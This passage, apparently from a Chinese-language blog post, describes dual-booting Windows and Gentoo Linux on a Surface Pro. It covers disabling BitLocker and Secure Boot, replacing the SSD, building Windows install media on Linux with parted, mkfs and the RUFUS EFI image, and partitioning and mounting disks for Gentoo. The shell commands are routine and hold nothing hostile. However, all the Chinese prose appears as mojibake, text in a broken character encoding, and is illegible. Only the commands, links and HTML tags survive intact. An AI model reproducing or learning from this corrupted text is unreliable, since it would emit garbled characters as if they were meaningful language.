å¯¹äºç¬”è€…è€Œè¨€è¿˜æœ‰ä¸€ç‚¹åŠé€€çš„ä¾¿æ˜¯ non-FHS compliance ï¼Œè™½ç„¶è¯´ NixOS å¯ç”¨çš„è½¯ä»¶åŒ…ç¡®å®æ˜¯æ•°ä¸€æ•°äºŒçš„å¤šï¼Œä½†è¿™æ ·çš„ç³»ç»Ÿæ„é€ åœ¨ç¬”è€…çœ‹æ¥å¹¶ä¸å¤Ÿä¼˜é›…ï¼‰</p><p>æœ€é‡è¦çš„æ˜¯ï¼Œ<a href="https://en.wikipedia.org/wiki/Richard_Stallman">Richard Stallman</a> æ›¾ç»è¯´è¿‡ï¼ˆ <del>å®é™…ä¸Šæ²¡è¯´è¿‡</del> ï¼‰ï¼šInstall Gentooâ€”â€”</p><p><img src="https://s2.loli.net/2024/04/30/jEKw7bCOu9rMhlD.png" alt="è™½ç„¶ä»–ç”¨çš„ä¸æ˜¯ Gentoo è€Œæ˜¯ Trisquel.jpg"></p><p>äºæ˜¯åœ¨ç»å†äº†å„ç§æ€è€ƒä¹‹åï¼Œç¬”è€…æœ€ç»ˆé€‰æ‹©åœ¨ Surface Pro ä¸Šå°è¯•æŠ˜è…¾ä¸€ä¸‹ Gentoo Linux è¿™ä¸€ä¸ªç›¸å¯¹è€Œè¨€æ¯”è¾ƒå°ä¼—çš„å‘è¡Œç‰ˆ</p><h1 id="0x01-å®‰è£…-Windows"><a href="#0x01-å®‰è£…-Windows" class="headerlink" title="0x01. å®‰è£… Windows"></a>0x01. å®‰è£… Windows</h1><p>å› ä¸ºç¬”è€…æ˜¯è¦ç”¨ä¸€å—å…¨æ–°çš„ç¡¬ç›˜æ›¿æ¢æ‰åŸæœ‰çš„ç¡¬ç›˜ï¼Œå› æ­¤ç³»ç»Ÿå®‰è£…éœ€è¦é‡å¤´å¼€å§‹ï¼ˆ <del>è™½ç„¶å®é™…ä¸Šæœ‰ä¸€äº›å·²çŸ¥çš„ç³»ç»Ÿè¿ç§»æ–¹æ¡ˆï¼Œä½†æ˜¯ğŸ‘´å¤ªæ‡’äº†</del> ï¼‰ï¼Œå› ä¸º Windows å¾ˆå®¹æ˜“å¯¹ç¡¬ç›˜åˆ†åŒºè¿›è¡Œé¢„æœŸå¤–çš„ä¿®æ”¹ï¼Œæ‰€ä»¥åœ¨å®‰è£…åŒç³»ç»Ÿçš„æƒ…å†µä¸‹ç¬”è€…é€‰æ‹©å…ˆå®‰è£… Windows å†å®‰è£… Linux</p><h2 id="æ›¿æ¢ç¡¬ç›˜"><a href="#æ›¿æ¢ç¡¬ç›˜" class="headerlink" title="æ›¿æ¢ç¡¬ç›˜"></a>æ›¿æ¢ç¡¬ç›˜</h2><p>å› ä¸ºæˆ‘ä»¬åé¢å®‰è£… Linux è¦å…³é—­ Secure Bootï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆéœ€è¦åœ¨è®¾ç½®ä¸­å…³é—­ BitLockerï¼Œä»è€Œç¡®ä¿åŸç¡¬ç›˜çš„å¯ç”¨æ€§</p><blockquote><p> å¦åˆ™åé¢å°±åªèƒ½ä¸Š <a href="https://aka.ms/myrecoverykey">https://aka.ms/myrecoverykey</a> æ‰¾åŸæœ‰å¯†é’¥è¿›è¡Œæ¢å¤äº†ï¼Œå¦‚æœæ²¡æœ‰ç™»å½•è¿‡å¾®è½¯è´¦æˆ·çš„è¯é‚£å°±åªèƒ½å’ŒåŸç¡¬ç›˜æ•°æ®<strong>å½»åº•è¯´å†è§äº†</strong>â€¦â€¦</p></blockquote><p><img src="https://s2.loli.net/2024/04/24/tIUp49yHldzxkm2.png" alt="è¿™ä¸ªè¿‡ç¨‹ä¼šéå¸¸æ…¢ï¼Œå› ä¸º Surface è®¾å¤‡çš„æ€§èƒ½æå…¶æ‹‰èƒ¯"></p><p>æ¥ä¸‹æ¥è¿› UEFI ä¸­å…³é—­ Secure Bootï¼Œåœ¨å…³æœºçŠ¶æ€ä¸‹æŒ‰ä½éŸ³é‡å¢åŠ é”®ä¸åŠ¨ï¼Œä¹‹åå†æŒ‰ä¸€æ¬¡ç”µæºé”®å³å¯è¿›å…¥ Surface çš„ UEFI ç•Œé¢ï¼Œæ‰¾åˆ° <code>Secure Boot Configuration</code> é€‰æ‹© <code>None</code> å³å¯ï¼š</p><p><img src="https://s2.loli.net/2024/04/24/q8MC6dsJ5HN3ToX.png" alt="u1s1 Surface çš„ UEFI è™½ç„¶ç®€ä»‹ä½†æ˜¯å‡‘å‡‘çš„"></p><p>è§£é”ä¹‹åæ¯æ¬¡å¼€æœºéƒ½ä¼šæ˜¾ç¤ºä¸€ä¸ªå¤§å¤§çš„çº¢è‰²æ¡å’Œä¸€ä¸ªğŸ”“ï¼š</p><p><img src="https://s2.loli.net/2024/04/24/eJkMLOUzrG8NAvl.jpg" alt="ä¸‘ä¸­ä¸‘è®¾è®¡ï¼Œæ„Ÿè§‰ä¸å¦‚æŠŠğŸ”“æ”¾åœ¨ Win logo æ—è¾¹å¹¶æ’"></p><p>ç„¶ååœ¨å…³æœºçŠ¶æ€ä¸‹ç”¨æ‰‹æœºå–å¡é’ˆåœ¨èƒŒé¢çš„å°å­”ä¸€æˆ³å°±èƒ½æ›´æ¢ç¡¬ç›˜äº†ï¼Œä» Surface Pro 8 å¼€å§‹å¾®è½¯çš„è®¾å¤‡æœ‰äº†ä¸€å®šçš„å¯ç»´æŠ¤æ€§ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ç¡¬ç›˜èºä¸çš„è§„æ ¼ä¸ºä¸å¤ªå¸¸è§çš„ <code>T3</code> å…­è§’èºä¸ï¼Œä»¥åŠåœ¨å®Œæˆç¡¬ç›˜æ›´æ¢ä¹‹å <strong>éœ€è¦æ’ç”µæ‰èƒ½å¼€æœº</strong> ï¼Œä¸è¿‡æ— è®ºæ˜¯é€šè¿‡ surface connect è¿˜æ˜¯é€šè¿‡é›·ç”µ 4 æ¥å£æ’ç”µéƒ½æ˜¯å¯è¡Œçš„</p><p><img src="https://s2.loli.net/2024/04/27/iQEMbORa8qcP12j.jpg" alt="å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨ç‰™ç­¾"></p><blockquote><p>ç„¶è€Œä»…é™äº Surface Pro ç³»åˆ—ï¼Œä¹Ÿå°±æ˜¯åªæœ‰ Pro 8&#x2F;9&#x2F;10ï¼ˆåœ¨ç¬”è€…ç¼–å†™æ­¤æ–‡æ—¶ï¼ŒPro 10 ä»…æœ‰å•†ä¸šç‰ˆï¼‰ èƒ½å¿«æ·æ›´æ¢ç¡¬ç›˜ï¼ŒLaptop ç­‰å…¶ä»–äº§å“çº¿ä¾ç„¶éœ€è¦ç¹ççš„æ‹†æœºæµç¨‹ï¼Œä¸è¿‡è¿™ä¸ªä¾¿æ·æ‹†è§£è®¾è®¡åœ¨ç¬”è€…çœ‹æ¥æœ‰ç‚¹ç±»ä¼¼ä¹‹å‰è§è¿‡çš„ ThinkPad çš„é«˜ç«¯å·¥ä½œç«™æ‰æœ‰çš„ç‰¹æ€§ğŸ¤” é—æ†¾çš„æ˜¯å¾®è½¯å¦‚ä»Šä¾ç„¶å°šæœªæ”¯æŒæ›´æ¢å†…å­˜æ¡ï¼Œ<del>å¦åˆ™ğŸ‘´å°†æˆä¸ºå¾®è½¯çš„é“è¡€å«å£«</del></p></blockquote><h2 id="ä½¿ç”¨-PE-å¯åŠ¨ç›˜è¿›è¡Œå®‰è£…"><a href="#ä½¿ç”¨-PE-å¯åŠ¨ç›˜è¿›è¡Œå®‰è£…" class="headerlink" title="ä½¿ç”¨ PE å¯åŠ¨ç›˜è¿›è¡Œå®‰è£…"></a>ä½¿ç”¨ PE å¯åŠ¨ç›˜è¿›è¡Œå®‰è£…</h2><blockquote><p>Windows ISO åœ¨ <a href="https://www.microsoft.com/software-download/windows11">å¾®è½¯å®˜ç½‘</a> ä¾¿èƒ½è¿›è¡Œä¸‹è½½ï¼Œè¿™é‡Œå°±ä¸å†èµ˜å™äº†</p></blockquote><p>æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨å¯ç§»åŠ¨ç£ç›˜ï¼ˆå¦‚ U ç›˜ã€ç§»åŠ¨ç¡¬ç›˜ç­‰è®¾å¤‡ï¼‰ä¸Šåˆ›å»º Windows å®‰è£…ä»‹è´¨ï¼Œä¸è¿‡ç”±äºå®˜ç½‘ä¸‹è½½çš„ ISO é•œåƒç¼ºå°‘äº†åˆ†åŒºè¡¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è¿›è¡Œé…ç½®ï¼Œåœ¨ Windows ä¸Šä½ å¯ä»¥å¾ˆè½»æ¾åœ°ä½¿ç”¨ <a href="https://rufus.ie/en/">RUFUS</a> ä¸€ç±»çš„å·¥å…·å®Œæˆè¿™ä¸€å·¥ä½œï¼Œè‹¥ä½ å’Œç¬”è€…ä¸€æ ·æ—¥å¸¸ä½¿ç”¨ Linux ä½œä¸ºå·¥ä½œç³»ç»Ÿï¼Œåˆ™æš‚æ—¶æ²¡æœ‰æ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆ</p><p>ä¸è¿‡å¥½åœ¨ä½¿ç”¨ PE å¯åŠ¨ç›˜è¿›è¡Œå®‰è£…å·²ç»æ˜¯ä¸€ä¸ªè¾ƒä¸ºæˆç†Ÿçš„è§£å†³æ–¹æ¡ˆäº†ï¼Œæ–¹ä¾¿èµ·è§ç¬”è€…é€‰æ‹©ç›´æ¥ä½¿ç”¨ç°æœ‰çš„è§£å†³æ–¹æ¡ˆè¿›è¡Œå®‰è£…ï¼šï¼‰</p><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨è¿™ä¸ªé˜¶æ®µ<strong>è§¦æ§å±å’ŒåŸè£…é”®ç›˜è§¦æ‘¸æ¿éƒ½æ˜¯æ— æ³•ä½¿ç”¨çš„ï¼Œä½ å¿…é¡»å¤–æ¥é”®é¼ è¿›è¡Œä½¿ç”¨</strong></p><p><img src="https://s2.loli.net/2024/04/29/RJF6nfCQYvLuesG.png" alt="ç¬”è€…å¾ˆä¹…ä»¥å‰è‡ªåˆ¶çš„å¯åŠ¨ç›˜ï¼Œäº‹å®è¯æ˜è¿™äº›å·¥å…·è™½ç„¶è€ä½†æ˜¯éƒ½è¿˜æŒºå¥½ç”¨"></p><p>ä¹‹åå°±æ˜¯æ­£å¸¸è¿›ç³»ç»Ÿäº†ï¼Œä¸è¿‡åœ¨æ›´æ–°å®Œæˆä¹‹å‰<strong>åŸè£…é”®ç›˜è§¦æ‘¸æ¿ä¾æ—§ç”¨ä¸äº†</strong>ï¼š</p><p><img src="https://s2.loli.net/2024/04/29/s851nuVo43KpmWj.jpg"></p><h2 id="Extra-æ‰‹å·¥åˆ›å»ºå®‰è£…ä»‹è´¨ï¼ˆnot-recommendedï¼‰"><a href="#Extra-æ‰‹å·¥åˆ›å»ºå®‰è£…ä»‹è´¨ï¼ˆnot-recommendedï¼‰" class="headerlink" title="Extra. æ‰‹å·¥åˆ›å»ºå®‰è£…ä»‹è´¨ï¼ˆnot recommendedï¼‰"></a>Extra. æ‰‹å·¥åˆ›å»ºå®‰è£…ä»‹è´¨ï¼ˆnot recommendedï¼‰</h2><p>å¦‚æœä½ å¸Œæœ›è‡ªå·±åŠ¨æ‰‹ä¸°è¡£è¶³é£Ÿï¼Œåˆ™ä¹Ÿå¯ä»¥å‚ç…§è¿™ä¸€èŠ‚çš„å†…å®¹ï¼Œä¸è¿‡ç¬”è€…ä¸å¤ªæ¨èï¼ˆ<strong>æ¯”è¾ƒæµªè´¹æ—¶é—´</strong>ï¼‰</p><blockquote><p>ä¸»è¦åŸå› æ˜¯ Windows å®‰è£…é•œåƒä¸­å¹¶æ²¡æœ‰æä¾›ä¸€ä¸ªåˆ†åŒºè¡¨ï¼Œå¦åˆ™ç›´æ¥ <code>dd</code> ä¸€æŠŠæ¢­å°±å¥½äº†ï¼š(</p></blockquote><p>é¦–å…ˆä½¿ç”¨ <code>parted</code> æ–°å»ºåˆ†åŒºï¼Œè¿™é‡Œæˆ‘ä»¬å»ºç«‹ä¸€ä¸ª GPT åˆ†åŒºè¡¨ï¼Œå¹¶å»ºç«‹ä¸¤ä¸ªåˆ†åŒºï¼š</p><ul><li>ä¸€ä¸ª NTFS åˆ†åŒºï¼šå­˜æ”¾ Windows å®‰è£…é•œåƒä¸­çš„æ–‡ä»¶</li><li>ä¸€ä¸ª EFI åˆ†åŒºï¼šå­˜æ”¾<a href="https://github.com/pbatard/rufus/blob/master/res/uefi/uefi-ntfs.img">ç”± RUFUS æä¾›çš„ EFI å¯åŠ¨ç¨‹åº</a></li></ul><blockquote><p>ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸é€‰æ‹©ç›´æ¥æ‹·è´ Win é•œåƒè¿› EFI åˆ†åŒºï¼Ÿè™½ç„¶ Win é•œåƒæœ¬èº«ä¾¿æ˜¯ä¸€ä¸ªå¯å¯åŠ¨çš„ EFI åˆ†åŒºï¼Œä½†æ˜¯å…¶å®‰è£…æ–‡ä»¶ <code>source/install.wim</code> é€šå¸¸å¤§äº UEFI specs æ‰€æ”¯æŒçš„ fat32 æ–‡ä»¶ç³»ç»Ÿæ‰€æ”¯æŒçš„æœ€å¤§æ–‡ä»¶å¤§å°ï¼ˆ4Gï¼‰ï¼Œè™½ç„¶éƒ¨åˆ† OEM çš„ UEFI ä¼šé¢å¤–æœ‰å¯¹ exFAT æˆ–æ˜¯ NTFS çš„æ”¯æŒï¼Œä½†ä¸ºäº†å…¼å®¹æ€§è€ƒè™‘æˆ‘ä»¬è¿˜æ˜¯é€‰æ‹© fat32ï¼Œå¹¶ä½¿ç”¨ç¬¬ä¸‰æ–¹è½¯ä»¶ RUFUS æ‰€æä¾›çš„ EFI ç¨‹åº</p></blockquote><p>è¿™é‡Œçš„ <code>/dev/sda</code> ä¸ºä½ çš„ U ç›˜è®¾å¤‡è·¯å¾„ï¼Œè¯·è‡ªè¡Œè¾¨åˆ«ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>NTFS åˆ†åŒºåº”å½“åœ¨ç¬¬ä¸€ä½ï¼ŒEFI åˆ†åŒºåœ¨ç¬¬äºŒä½</strong> ï¼Œå¦åˆ™ä¼šå¯¼è‡´ <em>æ— æ³•è¿›è¡Œå®‰è£…</em>  ï¼ˆæç¤ºç¼ºå°‘é©±åŠ¨ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo parted /dev/sda</span>                        <br>GNU Parted 3.6<br>Using /dev/sda<br>Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.<br>(parted) unit s                                                           <br>(parted) mktable gpt<br>Warning: The existing disk label on /dev/sda will be destroyed and all data on this disk will be lost. Do you<br>want to continue?<br>Yes/No? Yes                                                               <br>(parted) mkpart windows-iso ntfs 2048 16777215<br>(parted) mkpart efi fat32 16777216 33554432<br>(parted) set 2 esp on                                                     <br>(parted) set 2 boot on                                                    <br>(parted) name 1 Windows                                                   <br>(parted) name 2 EFI                                                       <br>(parted) quit<br>Information: You may need to update /etc/fstab.<br><br></code></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œå¦‚ä¸‹ä¸¤æ¡å‘½ä»¤åˆå§‹åŒ– EFI åˆ†åŒºçš„æ–‡ä»¶ç³»ç»Ÿï¼š</p><blockquote><p>éœ€è¦è¯´æ˜çš„æ˜¯ä¸ NTFS ç›¸å…³çš„æ“ä½œåœ¨ Linux ä¸‹éƒ½ä¼šç‰¹åˆ«æ…¢ï¼ˆè‡³å°‘åœ¨ç¬”è€…çš„æœºå™¨ä¸Šå¦‚æ­¤ï¼Œè¿™å¯èƒ½å’Œ <code>ntfs-3g</code> çš„æ€§èƒ½ç›¸å…³ï¼‰ï¼Œå»ºè®® <del>å…¶å®ä¹Ÿåªèƒ½</del> è€å¿ƒç­‰å¾…ï¼šï¼‰</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.ntfs /dev/sda1</span><br>Cluster size has been automatically set to 4096 bytes.<br>Initializing device with zeroes: 100% - Done.<br>Creating NTFS volume structures.<br>mkntfs completed successfully. Have a nice day.<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.fat -F 32 /dev/sda2</span>               <br>mkfs.fat 4.2 (2021-01-31)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°† ISO ä¸­æ•°æ®æ‹·è´åˆ° U ç›˜å½“ä¸­ï¼Œå†å°† <a href="https://github.com/pbatard/rufus/blob/master/res/uefi/uefi-ntfs.img">RUFUS</a> æä¾›çš„ EFI é•œåƒæ‹·è´åˆ° EFI åˆ†åŒºå³å¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> /mnt/&#123;iso,efi,win&#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount ~/Downloads/Win11_23H2_Chinese_Simplified_x64v2.iso /mnt/iso/</span><br>mount: /mnt/iso: WARNING: source write-protected, mounted read-only.<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sda1 /mnt/win/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sda2 /mnt/efi/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> -r /mnt/iso/* /mnt/win/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/iso</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount ~/Downloads/uefi-ntfs.img /mnt/iso/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> -r /mnt/iso/* /mnt/efi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/efi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/win</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/iso</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sync</span></span><br></code></pre></td></tr></table></figure><p>ä¹‹åå°±èƒ½ <del>åŸç¥å¯åŠ¨</del> æ­£å¸¸å¯åŠ¨è¿›å…¥å®‰è£…ç•Œé¢äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>åŸè£…çš„é”®ç›˜è§¦æ‘¸æ¿å®Œå…¨æ— æ³•ä½¿ç”¨ï¼Œå› æ­¤ä½ éœ€è¦é¢å¤–ç”¨æ‰©å±•åè¿æ¥é€šç”¨æ— é©±é”®é¼ </strong>ï¼š</p><blockquote><p>åŸè£…é”®é¼ ä»…åœ¨ UEFI å¯åŠ¨é˜¶æ®µå¯ç”¨ï¼Œç›®æµ‹æ˜¯ Windows å®˜ç½‘é»˜è®¤çš„å®‰è£…ä»‹è´¨ä¸­å¹¶æœªå¸¦æœ‰å¯¹åº”çš„é©±åŠ¨</p></blockquote><p><img src="https://s2.loli.net/2024/04/27/tRg15behirlnsIU.jpg" alt="Windowsï¼Œå¯åŠ¨â€”â€”"></p><blockquote><p>ä»¥åŠè¿™ä¸ªå®‰è£…æ–¹å¼åœ¨ç¬”è€…çš„ç”µè„‘ä¸Šå¹¶æœªæˆåŠŸï¼Œä½†æ˜¯ä½¿ç”¨å„ç§ç¬¬ä¸‰æ–¹çš„ PE å¯åŠ¨ç›˜æä¾›çš„ç¬¬ä¸‰æ–¹å·¥å…·å´èƒ½è½»æ¾å®Œæˆï¼Œ <del>ğŸ‘´åªèƒ½è¯´ Windows å®˜æ–¹çš„å®‰è£…ç¨‹åºç¡®å®æ¯”è¾ƒåƒåœ¾</del></p></blockquote><h1 id="0x02-å®‰è£…-Gentoo-Linux"><a href="#0x02-å®‰è£…-Gentoo-Linux" class="headerlink" title="0x02. å®‰è£… Gentoo Linux"></a>0x02. å®‰è£… Gentoo Linux</h1><p>å®Œæˆ Windows å®‰è£…ä¹‹åæ¥ä¸‹æ¥æ˜¯å®‰è£… Gentoo Linuxï¼Œåœ¨å¼€å§‹ä¹‹å‰åˆ«å¿˜äº†åœ¨ Windows ä¸Šè¿›å…¥ç¡¬ç›˜ç®¡ç†ä¸­åˆ’å‡ºä¸€å—å®Œæ•´çš„ç©ºé—´ç•™ç»™ Gentoo Linux ä½¿ç”¨ï¼Œè¿™é‡Œç¬”è€…å°±ä¸æˆªå›¾äº†ï¼šï¼‰</p><h2 id="åˆ›å»ºå®‰è£…ä»‹è´¨"><a href="#åˆ›å»ºå®‰è£…ä»‹è´¨" class="headerlink" title="åˆ›å»ºå®‰è£…ä»‹è´¨"></a>åˆ›å»ºå®‰è£…ä»‹è´¨</h2><p>åœ¨ <a href="https://www.gentoo.org/downloads/">Gentoo å®˜ç½‘ä¸Šä¸‹è½½é•œåƒå</a> ç”¨ balenaEtcher æˆ–æ˜¯ä¸€äº›å…¶ä»–çš„è½¯ä»¶æˆ–æ˜¯ç›´æ¥ <code>dd</code> å¾€ U ç›˜é‡Œå†™éƒ½ okï¼Œå…¶ä¸­ <code>Minimal Installation CD</code> å’Œ Arch ä¸€æ ·åªæœ‰å‘½ä»¤è¡Œï¼Œè€Œ <code>LiveGUI USB Image</code> åˆ™å¸¦æœ‰ä¸€ä¸ªå›¾å½¢ç¯å¢ƒï¼Œ<strong>ä½†æ˜¯æœ€åéƒ½æ˜¯è¦æ•²å‘½ä»¤è¡Œä¸€æ­¥æ­¥å®‰è£…</strong> ï¼Œåªæ˜¯å¸¦ GUI çš„ä¼šæœ‰ä¸ª KDE æ¡Œé¢è®©ä½ èƒ½åœ¨ Konsole ä¸­æ•²ï¼Œæ–¹ä¾¿å¼€æµè§ˆå™¨å’Œè”ç½‘ ï¼šï¼‰</p><blockquote><p>ä»¥åŠåˆ«å¿˜äº†åœ¨ Surface UEFI ä¸­å°† USB è°ƒæ•´ä¸ºç¬¬ä¸€å¯åŠ¨é¡¹</p></blockquote><p>è¿›å…¥æ¡Œé¢ååªæœ‰ä¸€ä¸ª <a href="https://wiki.gentoo.org/wiki/Handbook:Main_Page">Gentoo Linux Handbook</a> çš„å¿«æ·æ–¹å¼ï¼Œè€Œä¸ä¼¼å…¶ä»– Linux å‘è¡Œç‰ˆæœ‰å¼•å¯¼å¼å®‰è£…ç¨‹åºï¼š</p><p><img src="https://s2.loli.net/2024/04/30/xaksIHeSrmup2VT.jpg" alt="éœ€è¦æ³¨æ„çš„æ˜¯ Surface å±å¹•åˆ†è¾¨ç‡è¾ƒé«˜ï¼Œå»ºè®®è°ƒä¸€ä¸‹ç¼©æ”¾å logout å†é‡æ–°è¿›æ¥"></p><h2 id="åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ"><a href="#åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ"></a>åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ</h2><blockquote><p>ç½‘ç»œè¿æ¥ç¬”è€…ç›´æ¥ä½¿ç”¨ KDE ç»„ä»¶å®Œæˆäº†ï¼Œä¹ æƒ¯å‘½ä»¤è¡Œçš„ä¹Ÿå¯ä»¥å°è¯•ä½¿ç”¨ <code>net-setup</code> </p></blockquote><p>é¦–å…ˆæˆ‘ä»¬å…ˆä½¿ç”¨ <code>cfdisk</code> å¯¹ç¡¬ç›˜è¿›è¡Œåˆ†åŒºï¼ŒæŒ‰æƒ¯ä¾‹å»ºç«‹å››ä¸ªæ–°åˆ†åŒºï¼š</p><ul><li>EFI åˆ†åŒºï¼ˆ<code>fat32</code>ï¼ŒæŒ‚è½½åœ¨ <code>/boot/efi</code> ï¼‰ï¼šå­˜æ”¾ EFI å¯åŠ¨ç¨‹åºï¼ˆgrubï¼‰</li><li>ç³»ç»Ÿåˆ†åŒºï¼ˆ <code>ext4</code> ï¼ŒæŒ‚è½½åœ¨ <code>/</code> ï¼‰ï¼šå­˜æ”¾ç³»ç»ŸåŸºæœ¬æ–‡ä»¶</li><li>æ•°æ®åˆ†åŒºï¼ˆ <code>ext4</code> ï¼ŒæŒ‚è½½åœ¨ <code>/home</code> ï¼‰ï¼šå­˜æ”¾ç”¨æˆ·æ•°æ®</li><li>SWAP åˆ†åŒºï¼ˆ<code>swap</code> ï¼‰ï¼šäº¤æ¢å†…å­˜</li></ul><p>Surface ä¸Šä»…æœ‰ä¸€å— SSD ï¼Œæ‰€ä»¥ç¡¬ç›˜è·¯å¾„åŸºæœ¬ä¸Šå®šæ­»ä¸º <code>/dev/nvme0n1</code> ï¼Œå¦‚æœä½ åœ¨å…¶ä»–æœ‰å¤šå—ç¡¬ç›˜çš„æœºå™¨ä¸Šå‚ç…§æœ¬æ–‡è¿›è¡Œé…ç½®åˆ™æ³¨æ„è¯†åˆ«è‡ªå·±æƒ³è¦å®‰è£…çš„é”®ç›˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">cfdisk /dev/nvme0n1</span><br></code></pre></td></tr></table></figure><blockquote><p>æ³¨ï¼šè¿™ä¸€æ­¥ä½¿ç”¨ LiveGUI CD ä¸­çš„ KDE Partitioner æˆ–æ˜¯ GParted ä¹Ÿå¯ä»¥</p></blockquote><p><img src="https://s2.loli.net/2024/04/30/y6X4YeOlGKPbNkC.jpg" alt="100M æ˜¯ Windows åˆ†åŒºå¼„é”™äº†ç•™ä¸‹æ¥çš„ä¸€ä¸ªå¤šä½™çš„æ— ç”¨ç©ºé—´ï¼Œå› ä¸º NTFS æ²¡æ³•å‰æ‰©æ‰€ä»¥ç¬”è€…ä¹Ÿæ‡’å¾—ç®¡äº†"></p><p>æ¥ä¸‹æ¥åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿï¼Œæƒ¯ä¾‹åœ° <code>mkfs</code> ä¸€æŠŠæ¢­ï¼Œå¼€å§‹ä¹‹å‰æœ€å¥½å…ˆ <code>fdisk -l</code> å†è¾¨åˆ«ä¸€ä¸‹è‡ªå·±æƒ³è¦æ ¼å¼åŒ–çš„åˆ†åŒºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.fat -F 32 /dev/nvme0n1p4</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p5</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkswap /dev/nvme0n1p6</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">swapon /dev/nvme0n1p6</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p7</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/30/FCveHV8alMDSgPW.jpg" alt="æ—¥å¿—è¾“å‡ºå¤ªé•¿äº†ï¼Œæ²¡æ³•æ‹å®Œå±ï¼Œå°†å°±çœ‹çœ‹"></p><p>æœ€åå°±æ˜¯æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿäº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p5 /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/boot</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/boot/efi</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/home</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p4 /mnt/gentoo/boot/efi</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p7 /mnt/gentoo/home</span><br></code></pre></td></tr></table></figure><h2 id="å®‰è£…-Stage-3"><a href="#å®‰è£…-Stage-3" class="headerlink" title="å®‰è£… Stage 